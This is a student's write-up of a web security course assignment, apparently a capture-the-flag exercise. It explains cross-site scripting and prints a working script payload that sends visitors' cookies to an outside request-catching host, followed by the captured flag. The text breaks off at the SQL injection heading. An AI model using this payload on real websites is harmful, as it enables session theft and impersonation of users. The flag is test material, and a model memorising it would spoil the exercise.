## Web Application Vulnerabilities
In this assignment try to exploit some vulnerabilities in web apps using techniques like SQL Injection and Code Injection. And also the way we can protect web applications of 
these form of attacks. Access to resources of the assignment is restricted due to the course policy, But I'll try to provide useful information on it.
### Cross-Site Scripting (XSS) 
This type of attack inculdes methods to inject codes to the website which are executed when this pages seen by the other users (XSS Refⅼeⅽteⅾ). I found some fields in the website which were exploitable. 
So I tried to inject a code to steal cookies of visitors and send them to desired address. Having the cookie, we can find session ID of users and exploit this for impersonation.  
By injecting following command in a part of website as fake image we can steal the cookie.
```
<script>new Image().src="http://ptsv.com/t/zrbff-1573749449/post?cookie="+document.cookie;</script>
```
In one of the fields of cookie you can see the flag of this part which is:
```
FLAG{ill_see_marvel_movies_ill_join_a_gym_ill_heart_things_on_instagram_ill_drink_vanilla_lette}
```
### SQL Injection 
